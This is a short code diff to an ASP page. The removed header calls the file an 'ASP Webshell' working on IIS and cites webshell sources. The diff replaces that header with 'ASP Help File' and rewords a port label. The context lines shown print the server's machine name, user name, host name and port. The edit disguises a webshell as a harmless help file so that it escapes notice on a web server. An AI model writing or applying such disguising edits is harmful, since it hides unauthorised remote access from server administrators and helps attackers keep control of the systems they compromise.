@@ -1,10 +1,5 @@
 <!--
-ASP Webshell
-Working on latest IIS 
-Referance :- 
-https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
-http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
-http://www.w3schools.com/asp/
+ASP Help File
 -->
 
 
@@ -31,7 +26,7 @@ end Function
 <%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
 <%Response.Write(Request.ServerVariables("server_name"))%>
 <p>
-<b>The server's port:</b>
+<b>Host Port:</b>
 <%Response.Write(Request.ServerVariables("server_port"))%>
 </p>
 <p>
